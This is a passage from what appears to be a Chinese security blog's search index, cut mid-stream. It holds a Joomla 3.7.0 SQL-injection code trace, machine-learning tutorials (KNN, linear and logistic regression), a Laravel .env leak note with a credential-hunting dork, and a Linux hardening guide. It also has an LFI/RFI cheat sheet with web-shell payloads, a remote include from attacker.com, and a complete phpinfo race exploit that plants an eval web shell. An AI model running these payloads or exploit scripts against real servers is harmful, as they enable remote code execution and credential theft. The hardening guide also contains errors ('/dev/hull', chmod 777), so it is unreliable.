(isset($this-&gt;_models[$model]))\t&#123;\t\t// Model exists, let&#x27;s build the method name\t\t$method = &#x27;get&#x27; . ucfirst($property);                       $property是我们传进的实参也就是&#x27;State&#x27;,那么拼接起来后的方法名就是getState,然后调用这个方法\t\t// Does the method exist?\t\tif (method_exists($this-&gt;_models[$model], $method))\t\t&#123;\t\t\t// The method exists, let&#x27;s call it and return what we get\t\t\t$result = $this-&gt;_models[$model]-&gt;$method();\t\t\treturn $result;\t\t&#125;\t&#125;\t// Degrade to JObject::get\t$result = parent::get($property, $default);\treturn $result;&#125;\n\n接下来跟踪getState，CVE-2017-8917_Joomla_3.7.0\\libraries\\legacy\\model\\legacy.php\npublic function getState($property = null, $default = null)\t&#123;\t\tif (!$this-&gt;__state_set)\t\t&#123;\t\t\t// Protected method to auto-populate the model state.\t\t\t$this-&gt;populateState();                         调用populateState函数\t\t\t// Set the model state set flag to true.\t\t\t$this-&gt;__state_set = true;\t\t&#125;\t\treturn $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default);\t&#125;\n追踪populateState函数CVE-2017-8917_Joomla_3.7.0\\administrator\\components\\com_fields\\models\\fields.php\nprotected function populateState($ordering = null, $direction = null)\t&#123;\t\t// List state information.\t\tparent::populateState(&#x27;a.ordering&#x27;, &#x27;asc&#x27;);                调用了父类populateState方法\t\t$context = $this-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.context&#x27;, &#x27;context&#x27;, &#x27;com_content.article&#x27;, &#x27;CMD&#x27;);\t\t$this-&gt;setState(&#x27;filter.context&#x27;, $context);\t\t// Split context into component and optional section\t\t$parts = FieldsHelper::extract($context);\t\tif ($parts)\t\t&#123;\t\t\t$this-&gt;setState(&#x27;filter.component&#x27;, $parts[0]);\t\t\t$this-&gt;setState(&#x27;filter.section&#x27;, $parts[1]);\t\t&#125;\t&#125;\n\n跟踪到父类CVE-2017-8917_Joomla_3.7.0\\libraries\\legacy\\model\\list.php\n// Receive &amp; set list optionsif ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . &#x27;.list&#x27;, &#x27;list&#x27;, array(), &#x27;array&#x27;))&#123;\tforeach ($list as $name =&gt; $value)\t&#123;\t\t// Exclude if blacklisted\t\tif (!in_array($name, $this-&gt;listBlacklist))\t\t&#123;\t\t\t// Extra validations\t\t\tswitch ($name)\t\t\t&#123;\t\t\t\tcase &#x27;fullordering&#x27;:\t\t\t\t\t$orderingParts = explode(&#x27; &#x27;, $value);\t\t\t\t\tif (count($orderingParts) &gt;= 2)\t\t\t\t\t&#123;\t\t\t\t\t\t// Latest part will be considered the direction\t\t\t\t\t\t$fullDirection = end($orderingParts);\t\t\t\t\t\tif (in_array(strtoupper($fullDirection), array(&#x27;ASC&#x27;, &#x27;DESC&#x27;, &#x27;&#x27;)))\t\t\t\t\t\t&#123;\t\t\t\t\t\t\t$this-&gt;setState(&#x27;list.direction&#x27;, $fullDirection);\t\t\t\t\t\t&#125;\n取了个list的值进来赋值给了$list$list遍历出来，接着switch 键值\nswitch完成后\n$this-&gt;setState(&#x27;list.&#x27; . $name, $value);\n通过这个可以设置list.fullordering设置后，下一步就要考虑如何取出来\n在视图文件中的display方法中，利用get(‘State’)来调用了getState方法。紧跟着这个操作的下一行，就有一个get(‘Item’)\npublic function display($tpl = null)    &#123;        $this-&gt;state         = $this-&gt;get(&#x27;State&#x27;);        $this-&gt;items         = $this-&gt;get(&#x27;Items&#x27;);\n跟踪getItems函数\npublic function getItems()&#123;\t// Get a storage key.\t$store = $this-&gt;getStoreId();\t// Try to load the data from internal storage.\tif (isset($this-&gt;cache[$store]))\t&#123;\t\treturn $this-&gt;cache[$store];\t&#125;\ttry\t&#123;\t\t// Load the list items and add the items to the internal cache.\t\t$this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState(&#x27;list.limit&#x27;));调用了一个_getListQuery方法\t&#125;\tcatch (RuntimeException $e)\t&#123;\t\t$this-&gt;setError($e-&gt;getMessage());\t\treturn false;\t&#125;\treturn $this-&gt;cache[$store];&#125;\n跟踪_getListQuery函数\nprotected function _getListQuery()&#123;\t// Capture the last store id used.\tstatic $lastStoreId;\t// Compute the current store id.\t$currentStoreId = $this-&gt;getStoreId();\t// If the last store id is different from the current, refresh the query.\tif ($lastStoreId != $currentStoreId || empty($this-&gt;query))\t&#123;\t\t$lastStoreId = $currentStoreId;\t\t$this-&gt;query = $this-&gt;getListQuery();\t&#125;\treturn $this-&gt;query;&#125;\n然后这里又调用了一个getListQuery方法，这里调用的getListQuery不是此类的getListQuery，而是子类，也就是filedsModel类里的getListQuery了,在该方法的最后CVE-2017-8917_Joomla_3.7.0\\administrator\\components\\com_fields\\models\\fields.php\n// Add the list ordering clause\t$listOrdering = $this-&gt;getState(&#x27;list.fullordering&#x27;, &#x27;a.ordering&#x27;);\t$orderDirn    = &#x27;&#x27;;\tif (empty($listOrdering))\t&#123;\t\t$listOrdering  = $this-&gt;state-&gt;get(&#x27;list.ordering&#x27;, &#x27;a.ordering&#x27;);\t\t$orderDirn     = $this-&gt;state-&gt;get(&#x27;list.direction&#x27;, &#x27;DESC&#x27;);\t&#125;\t$query-&gt;order($db-&gt;escape($listOrdering) . &#x27; &#x27; . $db-&gt;escape($orderDirn));\t\t\treturn $query;\n\n这里就调用getState将前面设置的list.fullordering的值给取了出来，然后带入到了order函数中去了，就造成了一个order by的注入\n\n![](15190501748892.png)\n\n","categories":["漏洞分析"],"tags":["PHP"]},{"title":"K Nearest Neighbor","url":"/K%20Nearest%20Neighbor/","content":"0x01 KNN采用测量不同特征值之间的距离进行分类\n\n\n优点：\n\n精度高\n对异常值不敏感\n无数据输入假定\n\n缺点：\n\n计算复杂度高\n空间复杂度高\n\n适用数据范围：\n\n数值型\n标称型\n\n0x02 算法实现算法描述\n\n1.计算测试数据与各个训练数据之间的距离\n\n2.按照距离的递增关系进行排序\n\n3.选取距离最小的K个点\n\n4.确定前K个点所在类别的出现频率\n\n5.返回前K个点中出现频率最高的类别作为测试数据的预测分类\n\n\ndef classify0(inX, dataSet, labels, k):    &#x27;&#x27;&#x27;    :param inX: 输入向量    :param dataSet: 训练数据集    :param labels: 标签    :param k: k    :return:    &#x27;&#x27;&#x27;    #距离计算    dataSetSize = dataSet.shape[0] #读取矩阵第一维度的长度    diffMat = tile(inX, (dataSetSize, 1)) - dataSet #tile把inX复制dataSetSize维度    sqDiffMat = diffMat**2    sqDistances = sqDiffMat.sum(axis=1)    distances = sqDistances**0.5    #选择距离最小的k个点    sortedDistIndicies = distances.argsort()    print(sortedDistIndicies)    classCount=&#123;&#125;    for i in range(k):        voteIlabel = labels[sortedDistIndicies[i]]        classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1    #排序    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True)    return sortedClassCount[0][0]\n\n\n0x03 实例1\n收集数据\n\n\n\n准备数据\n\ndef file2matrix(filename):    with open(filename, &quot;r&quot;) as fr:        frreadlines = fr.readlines()        numberOfLines = len(frreadlines)        returnMat = zeros((numberOfLines, 3))        classLabelVector = []        index = 0        for line in frreadlines:            line = line.strip()            listFromLine = line.split(&#x27;\\t&#x27;)            returnMat[index, :] = listFromLine[0:3]            labels = &#123;&#x27;didntLike&#x27;: 1, &#x27;smallDoses&#x27;: 2, &#x27;largeDoses&#x27;: 3&#125;            classLabelVector.append(labels[listFromLine[-1]])            index += 1        return returnMat, classLabelVector\n\n\n\n分析数据\n\ndef DataMat(data, labels):    fig = plt.figure()    ax = fig.add_subplot(111)    ax.scatter(data[:, 0], data[:, 1], 15.0*array(labels), 15.0*array(labels))    plt.show()\n\n\n处理数据\n\n归一化数值，转化到0~1之间\nnewV = (oldV-min)/(max-min)\ndef autoNorm(dataSet):    minVals = dataSet.min(0)    maxVals = dataSet.max(0)    ranges = maxVals - minVals    m = dataSet.shape[0]    normDataSet = dataSet - tile(minVals, (m, 1))    normDataSet = normDataSet/tile(ranges, (m, 1))    return normDataSet, ranges, minVals\n\n\n\n测试算法\n\n对hoRatio和k进行参数调整，寻找最佳值\ndef testData(data_mat, data_label):    hoRatio = 0.80 #内变量    normDataSet, ranges, minVals = autoNorm(data_mat)    m = normDataSet.shape[0]    numTestVecs = int(m * hoRatio)    trueCount = 0.0    for i in range(numTestVecs):        classifierResult = classify0(normDataSet[i, :], normDataSet[numTestVecs:m, :], data_label[numTestVecs:m], 5)        if (classifierResult == data_label[i]):            trueCount += 1.0    print(&quot;the total true rate is: %f&quot; % (trueCount/float(numTestVecs)*100) + &quot;%&quot;)    print(trueCount)\n\n\n使用算法\n\ndef usemode(a, b, c):    file_path = &quot;datingTestSet.txt&quot;    data_mat, data_label = file2matrix(file_path)    normDataSet, ranges, minVals = autoNorm(data_mat)    inarr = array([a, b, c])    classifierResult = classify0((inarr-minVals)/ranges, normDataSet, data_label, 5)    return classifierResult\nresult = usemode(40920, 8.326976, 0.953952)\n\n(inarr-minVals)/ranges是传入参数归一化后的结果，代入classify0模型，求出与历史数据中的临近值，即结果\n0x04 实例2手写数字识别\n\ndef img2vector(filename):    returnVect = zeros((1,1024))    fr = open(filename)    for i in range(32):        lineStr = fr.readline()        for j in range(32):            returnVect[0, 32*i+j] = int(lineStr[j])    return returnVectdef handwritingClassTest():    hwLabels = []    trainingFileList = listdir(&#x27;digits/trainingDigits&#x27;)    m = len(trainingFileList)    trainingMat = zeros((m, 1024))    for i in range(m):        #从文件名上解析当前文件中的正确值，存入label        fileNameStr = trainingFileList[i]        fileStr = fileNameStr.split(&#x27;.&#x27;)[0]        classNumStr = int(fileStr.split(&#x27;_&#x27;)[0])        hwLabels.append(classNumStr)        trainingMat[i, :] = img2vector(&#x27;digits/trainingDigits/%s&#x27; % fileNameStr)    testFileList = listdir(&#x27;digits/testDigits&#x27;)    trueCount = 0.0    mTest = len(testFileList)    for i in range(mTest):        fileNameStr = testFileList[i]        fileStr = fileNameStr.split(&#x27;.&#x27;)[0]        classNumStr = int(fileStr.split(&#x27;_&#x27;)[0])        vectorUnderTest = img2vector(&#x27;digits/testDigits/%s&#x27; % fileNameStr)        classifierResult = classify0(vectorUnderTest, trainingMat, hwLabels, 3)        if (classifierResult == classNumStr): trueCount += 1.0    print(&quot;\\nthe total true rate is: %f&quot; % (trueCount/float(mTest)))\n\n\n0x05 安全应用从数学角度来看，异常行为检测也是对被检测的未知行为进行分类的过程，未知行为与已知的正常行为相似，则该行为是正常行为，否则是入侵行为[1]\n\n还有像恶意软件检测等安全领域应用\n0x06 其他应用\n文字识别\n人脸识别\n医用图像处理\n\n参考：[1]基于 kNN 算法的异常行为检测方法研究\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"Laravel applications sensitive info leak","url":"/Laravel%20applications%20sensitive%20info%20leak/","content":".env 文件位于项目根目录下，作为全局环境配置文件。\ngoogle hack &quot;DB_PASSWORD&quot; filetype:env\n\n\n以下内容引用自https://www.cnblogs.com/yingww/p/5607766.html\n.env文件含有数据库账号密码等敏感数据，在laravel5.2中，在本地访问127.0.0.1/laravel/.env可直接访问到.env\n为避免.env被直接访问，可使用重定向，方法如下：\n在根目录下添加.htaccess文件（与.env处于同一个目录，Apache必须开启重定向扩展）.htaccess文件内容如下：\n将所有的的请求都重定向到public目录下\n&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteRule    ^$    public/    [L]RewriteRule    (.*) public/$1    [L]&lt;/IfModule&gt;\n这时将无法访问127.0.0.1/laravel/.env\n","categories":["安全技术"],"tags":["Web"]},{"title":"Linear Regression","url":"/Linear%20Regression/","content":"0x01 LR回归的目的是预测数值型的目标值\n线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出\n优点：\n\n结果易于理解\n计算不复杂\n\n缺点：\n\n对非线性数据拟合不好\n\n适用数据类型\n\n标称型\n数值型\n\n0x02 最佳拟合直线将数据视为直线进行建模\ndef standRegres(xArr, yArr):    &#x27;&#x27;&#x27;    计算最佳拟合直线    :param xArr:    :param yArr:    :return:    &#x27;&#x27;&#x27;    xMat = mat(xArr)    yMat = mat(yArr).T #Returns the transpose of the matrix    xTx = xMat.T*xMat    if linalg.det(xTx) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = xTx.I * (xMat.T*yMat)    return ws\n\n\n在用内积来预测y的时候，第一维将乘以前面的常数X0，第二维将乘以输入变量X1因为前面假定了X0=1，所以最终会得到y=ws[0]+ws[1]*X1\n\n局部加权线性回归\n\n给待预测点附近的每个点赋予一定的权重每次预测均需要事先选取出对应的数据子集使用“核”来对附近的点赋予更高的权重\ndef lwlr(testPoint, xArr, yArr, k=1.0):    &#x27;&#x27;&#x27;    局部加权线性回归    给定x空间中的任意一点，计算出对应的预测值yHat    :param testPoint:    :param xArr:    :param yArr:    :param k:    :return:    &#x27;&#x27;&#x27;    xMat = mat(xArr)    yMat = mat(yArr).T    m = shape(xMat)[0]    weights = mat(eye((m))) #对角权重矩阵    for j in range(m):        diffMat = testPoint - xMat[j, :]     #        weights[j, j] = exp(diffMat*diffMat.T/(-2.0*k**2))    xTx = xMat.T * (weights * xMat)    if linalg.det(xTx) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = xTx.I * (xMat.T * (weights * yMat))    return testPoint * ws\n\n\n\n缩减系数\n\n岭回归\n\n\n用来处理特征数多于样本数的情况\n用于在估计中加入偏差\n\ndef ridgeRegres(xMat, yMat, lam=0.2):    &#x27;&#x27;&#x27;    计算回归系数    :param xMat:    :param yMat:    :param lam:    :return:    &#x27;&#x27;&#x27;    xTx = xMat.T*xMat    denom = xTx + eye(shape(xMat)[1])*lam    if linalg.det(denom) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = denom.I * (xMat.T*yMat)    return ws    def ridgeTest(xArr, yArr):    xMat = mat(xArr)    yMat=mat(yArr).T    yMean = mean(yMat, 0)    yMat = yMat - yMean    xMeans = mean(xMat, 0)    xVar = var(xMat, 0)    xMat = (xMat - xMeans)/xVar    numTestPts = 30    wMat = zeros((numTestPts, shape(xMat)[1]))    for i in range(numTestPts):        ws = ridgeRegres(xMat, yMat, exp(i-10))        wMat[i, :] = ws.T    return wMat\n\n\n\n\nlasso前向逐步回归\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"Linux系统加固","url":"/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/","content":"为空口令用户设置密码cat /etc/passwd    注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序     查看是否存在空口令用户（X为存在密码，*为被封禁）passwd 空口令用户名\n缺省密码长度限制vim /etc/login.defs 查看PASS_MIN_LEN选项值PASS_MIN_LEN  8设置密码长度最短为8\n缺省密码生存周期限制vim /etc/login.defs PASS_MAX_DAYS 90PASS_MIN_DAYS 0设置帐户口令的生存期不长于90 天\n口令过期提醒vim /etc/login.defsPASS_WARN_AGE 7口令到期前多少天开始通知用户口令即将到期\n限制超级管理员远程登录vim /etc/ssh/sshd_config把PermitRootLogin yes修改为noservice sshd restart重启sshd服务如果遇到sshd: unrecognized service错误尝试一下service ssh restart用ps -ef | grep sshd查看一下服务是否启动\n\n\n为不同的管理员分配不同的账户cat /etc/passwduseradd usernamepasswd password增加新用户chmod 777 目录\n去除不需要的帐号、修改默认帐号的shell变量cat /etc/passwdcat /etc/shadow删除不需要的账户userdel usernamegroupdel username设置shellusermod -s /dev/hull username\n对系统账号进行登陆限制禁止某用户登陆example：bin:x:2:2:bin:/bin:/bin/bash=&gt;bin:x:2:2:bin:/bin:/bin/nologin禁用bin用户登陆touch /etc/nologin禁止除root以外所有用户登陆建议禁掉的用户：daemon   bin  sys  adm  lp   uucp   nuucp  smmsp等\n设置关键目录的权限关键目录：chmod 644 /etc/passwd chmod 600 /etc/shadow chmod 644 /etc/group\n设置目录权限ls -l查看权限权限前边的ld为d是目录文件,l是链接文件chmod -R 750 /etc/init.d/*\n设置关键文件的属性禁止ping# echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all 开启# echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all  关闭\n初始化&gt; iptables -F   #清空所有的链&gt; iptables -X  #清空所有自定义的链\n关掉全部端口&gt; iptables -P INPUT DROP&gt; iptables -P OUTPUT DROP\n开启端口第一步iptables -A INPUT -p icmp --icmp-type any -j ACCEPT允许icmp包进入iptables -A INPUT -s localhost -d localhost -j ACCEPT允许本地的数据包iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包进入iptables -A OUTPUT -p icmp --icmp any -j ACCEPT允许icmp包出去iptables -A OUTPUT -s localhost -d localhost -j ACCEPT允许本地数据包iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT允许已经建立和相关的数据包出去\n关闭端口号iptables -I INPUT -i eth0 -p tcp --dport 81 -j DROPiptables -I OUTPUT -o eth0 -p tcp --sport 81 -j DROP\n打开端口号iptables -I INPUT -i eth0 -p tcp --dport 81 -j ACCEPTiptables  -I OUTPUT -o eth0 -p tcp --sport 81 -j ACCEPT\n\n\n","categories":["安全技术"],"tags":["dev"]},{"title":"Local File Inclusion and Remote File Inclusion","url":"/Local%20File%20Inclusion%20and%20Remote%20File%20Inclusion/","content":"Local File Inclusion防御策略文件上传\n大小\n类型\n存储位置\n内容安全\n访问权限\n名称随机化\n\n文件下载\n下载路径\n敏感信息\n访问权限\n\n阿里云OSS安全 https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y\n1) Direct Local Includehttp://site.com/lfi.php?page=/etc/passwd\n\n\n\n2) php://filterphp://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include；\nhttp://www.site.com/lfi.php?page=php://filter/resource=config.phphttp://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php\n\n3) /proc/self/environRequest’s user agent can be found there\n用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用\nGET /lfi.php?page=/proc/self/environ&amp;cmd=id HTTP/1.1Host: www.site.comUser-Agent: &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;\n\n4) Including imagesIf image.jpg contains php code it will be interpreted.\nhttp://www.site.com/lfi.php?page=upload/image.jpg\n\n5) Zip and Phar wrappersFile must be zip archive with any extension\nphar://伪协议 &gt;&gt; 数据流包装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。\n用法：?file=phar://压缩包/内部文件\nhttp://www.site.com/lfi.php?page=zip://image.zip#shell.phphttp://www.site.com/lfi.php?page=phar://image.phar#shell.php\n\n6) File UploadIt requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.\n\nUpload a file and trigger a self-inclusion\nRepeat step 1 until successful attack\nBruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}\nShell\n\nWe have 62**6 possible values -&gt; 56800235584 filenames for temporary uploaded filesBirthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.\nimport itertoolsimport requestsimport sysprint(&#x27;[+] Trying to win the race&#x27;)f = &#123;&#x27;file&#x27;: open(&#x27;shell.php&#x27;, &#x27;rb&#x27;)&#125;for _ in range(4096 * 4096):    requests.post(&#x27;http://target.com/index.php?c=index.php&#x27;, f)print(&#x27;[+] Bruteforcing the inclusion&#x27;)for fname in itertools.combinations(string.ascii_letters + string.digits, 6):    url = &#x27;http://target.com/index.php?c=/tmp/php&#x27; + fname    r = requests.get(url)    if &#x27;load average&#x27; in r.text:  # &lt;?php echo system(&#x27;uptime&#x27;);        print(&#x27;[+] We have got a shell: &#x27; + url)        sys.exit(0)print(&#x27;[x] Something went wrong, please try again&#x27;)\n\nIt is possible to send 20 files in one request that will be accepted by the server.\n7) Session FilesSession文件一般存放在/tmp/、/var/lib/php/session/、/var/lib/php/session/等目录下，文件名字一般以sess_SESSIONID来保存。首先，查看找到session文件并包含一次：文件名可以通过firefox的fire cookie插件查看当前session值。实际应用过程中需要注意以下几点：1)    网站可能没有生成临时session，以cookie方式保存用户信息，或者根本就完全没有。2)    Session文件内容的控制，这个时候我们就需要先通过包含查看当前session的内容，看session值中有没有我们可控的某个变量，比如url中的变量值。或者当前用户名username。如果有的话，我们就可以通过修改可控变量值控制恶意代码写入session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的session文件的。我们控制使服务器报错的语句即可将恶意代码写入session。\n\n8) PHPInfo Script&lt;?php phpinfo(); ?&gt; \n\n9) 结合phpinfo包含临时文件php有个特性是我们向服务器上任意php文件post请求上传数据时，都会生成临时文件，默认是传到tmp目录下，并且文件名是随机的。当然，我们可以暴力猜解，但是这样子还是太过鸡肋的。国外一个安全研究者提出利用phpinfo来找出所上传的文件路径，因为phpinfo会记录一些请求，包括在服务器上生成的临时文件名字和目录。所以借助phpinfo()我们可以找出临时文件名并利用。\n#!/usr/bin/env python# encoding=utf-8# Author : idwar# http://secer.org&#x27;&#x27;&#x27;可能需要你改的几个地方：1、host2、port3、request中的phpinfo页面名字及路径4、hello_lfi() 函数中的url，即存在lfi的页面和参数5、如果不成功或报错，尝试增加padding长度到7000、8000试试6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改 Good Luck :)&#x27;&#x27;&#x27;import reimport urllib2import hashlibfrom socket import *from time import sleephost = &#x27;192.168.92.132&#x27;#host = gethostbyname(domain)port = 80shell_name = hashlib.md5(host).hexdigest() + &#x27;.php&#x27;pattern = re.compile(r&#x27;&#x27;&#x27;\\[tmp_name\\]\\s=&amp;gt;\\s(.*)\\W*error]&#x27;&#x27;&#x27;)payload = &#x27;&#x27;&#x27;idwar&lt;?php fputs(fopen(&#x27;./&#x27;&#x27;&#x27; + shell_name + &#x27;&#x27;&#x27;\\&#x27;,&quot;w&quot;),&quot;idwar was here&lt;?php eval(\\$_POST[a]);?&gt;&quot;)?&gt;\\r&#x27;&#x27;&#x27;req = &#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&#x27;&#x27;&#x27; % payloadpadding=&#x27;A&#x27; * 8000request=&#x27;&#x27;&#x27;POST /test/1.php?a=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27; HTTP/1.0\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27;\\rHTTP_ACCEPT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\\rHTTP_USER_AGENT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\\rHTTP_ACCEPT_LANGUAGE: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\\rHTTP_PRAGMA: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&#x27;&#x27;&#x27; % (len(req), host, req)def hello_lfi():    while 1:        s = socket(AF_INET, SOCK_STREAM)        s.connect((host, port))        s.send(request)        data = &#x27;&#x27;        while r&#x27;&lt;/body&gt;&lt;/html&gt;&#x27; not in data:            data = s.recv(9999)            search_ = re.search(pattern, data)            if search_:                tmp_file_name = search_.group(1)                url = r&#x27;http://192.168.92.132/test/2.php?s=%s%%00&#x27; % tmp_file_name                print url                search_request = urllib2.Request(url)                search_response = urllib2.urlopen(search_request)                html_data = search_response.read()                if &#x27;idwar&#x27; in html_data:                    s.close()                    return &#x27;\\nDone. Your webshell is : \\n\\n%s\\n&#x27; % (&#x27;http://&#x27; + host + &#x27;/&#x27; + shell_name)                    #import sys;sys.exit()        s.close()if __name__ == &#x27;__main__&#x27;:    print hello_lfi()    print &#x27;\\n Good Luck :)&#x27;\n\n\n\n10) Logs包含web server日志文件\n不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。\n直接访问test.php?file=../&lt;?php phpinfo();?&gt;.php，将会被记录下来。这样便成功将php代码写进log文件。\nFTP日志文件内容\n用户名填：&lt;?php phpinfo();?&gt;\nRemote File InclusionWorks when allow_url_include in php.ini is set to TRUE\n1) Direct Remote IncludeIncluding php file in text format directly\nhttp://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt\n\n2) Data:text/plainIncluding php code through data stream\ndata://伪协议 &gt;&gt; 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；\nhttp://www.site.com/lfi.php?page=data:text/plain;,&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=\n\n3) php://input?file=php://input 数据利用POST传过去\nPOST /lfi.php?page=php://input&amp;cmd=cd HTTP/1.1Host: www.site.comContent-Lenth: 39&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;\n\nFighting with extensions1) Null BytesAdd null byte that will terminate string\nhttp://www.site.com/lfi.php?page=/etc/passwd%00http://www.site.com/lfi.php?page=/etc/passwd%2500\n\n2) TruncationCut extension by creating long string\nhttp://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd\n\nhttp://www.site.com/lfi.php?page=/etc/passwd..............................\n\nhttp://www.site.com/lfi.php?page=/etc/passwd.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\\n\n\n\n\n\n\n\n参考：\n利用本地包含漏洞执行任意代码\nCTF-WIKI\nLFIboomCTF\n","categories":["安全技术"],"tags":["Web"]},{"title":"Logistic Regression","url":"/Logistic%20Regression/","content":"0x01 LR根据现有数据对分类边界线建立回归公式，以此进行分类\nLR的目的是寻找一个非线性函数Sigmoid的最佳拟合参数，求解过程可以由最优化 算法来完成在最优化算法中，最常用的就是梯度上升算法，而梯度上升算法又可以简化为随机梯度上升算法\n优点\n\n计算代价不高\n易于理解和实现\n\n缺点\n\n容易欠拟合\n分类精度可能不高\n\n适用数据类型\n\n数值型\n标称型\n\n类阶跃函数：Sigmoid函数\n\nLR分类器：在每个特征上都乘以一个回归系数，然后把 所有的结果值相加，将这个总和代入Sigmoid函数中，进而得到一个范围在0~1之间的数值。任 何大于0.5的数据被分入1类，小于0.5即被归入0类\n0x02 训练算法确定回归系数\n\n梯度上升法\n\n要找到某函数的 最大值，最好的方法是沿着该函数的梯度方向探寻\n\n\n训练数据\n\n\ndef sigmoid(inX):    &#x27;&#x27;&#x27;    sigmoid函数    :param inX:    :return:    &#x27;&#x27;&#x27;    return 1.0/(1+exp(-inX))def gradAscent(dataMatIn, classLabels):    &#x27;&#x27;&#x27;    梯度上升优化算法    :param dataMatIn:     :param classLabels:     :return:     &#x27;&#x27;&#x27;    dataMatrix = mat(dataMatIn) #转换为numpy矩阵数据类型    labelMat = mat(classLabels).transpose()    m, n = shape(dataMatrix)    alpha = 0.001 #步长    maxCycles = 500 #迭代次数    weights = ones((n, 1))    for k in range(maxCycles):    #计算真实类别与预测类别的差值        h = sigmoid(dataMatrix*weights)     #矩阵相乘        error = (labelMat - h)              #向量相减        weights = weights + alpha * dataMatrix.transpose() * error #矩阵相乘    return weights\n\n\n\n\n分析数据\n\ndef plotBestFit(weights):    &#x27;&#x27;&#x27;    import matplotlib.pyplot as plt    画出决策边界    :param weights:     :return:     &#x27;&#x27;&#x27;    dataMat, labelMat=loadDataSet()    dataArr = array(dataMat)    n = shape(dataArr)[0]     xcord1 = []    ycord1 = []    xcord2 = []    ycord2 = []    for i in range(n):        if int(labelMat[i]) == 1:            xcord1.append(dataArr[i, 1])            ycord1.append(dataArr[i, 2])        else:            xcord2.append(dataArr[i, 1])            ycord2.append(dataArr[i, 2])    fig = plt.figure()    ax = fig.add_subplot(111)    ax.scatter(xcord1, ycord1, s=30, c=&#x27;red&#x27;, marker=&#x27;s&#x27;)    ax.scatter(xcord2, ycord2, s=30, c=&#x27;green&#x27;)    x = arange(-3.0, 3.0, 0.1)    y = (-weights[0]-weights[1]*x)/weights[2] #设置sigmiod为0    ax.plot(x, y)    plt.xlabel(&#x27;X1&#x27;)    plt.ylabel(&#x27;X2&#x27;)    plt.show()\nplotBestFit(weights.getA()) #getA()函数与mat()函数的功能相反，将一个numpy矩阵转换为数组\n\n\n\n随机梯度上升算法\n\n在线学习算法一次仅用一个样本点来更新回归系数\ndef stocGradAscent0(dataMatrix, classLabels):    &#x27;&#x27;&#x27;    随机梯度上升算法    :param dataMatrix:    :param classLabels:    :return:    &#x27;&#x27;&#x27;    m, n = shape(dataMatrix)    alpha = 0.01    weights = ones(n)   #初始化    for i in range(m):        h = sigmoid(sum(dataMatrix[i]*weights))        error = classLabels[i] - h        weights = weights + alpha * error * dataMatrix[i]    return weights\n\n\n\n改进的随机梯度上升算法\n\ndef stocGradAscent1(dataMatrix, classLabels, numIter=150):    &#x27;&#x27;&#x27;    改进的随机梯度上升算法    :param dataMatrix:    :param classLabels:    :param numIter:默认迭代次数    :return:    &#x27;&#x27;&#x27;    m, n = shape(dataMatrix)    weights = ones(n)    for j in range(numIter):        dataIndex = list(range(m))        for i in range(m):            alpha = 4/(1.0+j+i)+0.0001    #每次迭代进行调整，不断减小            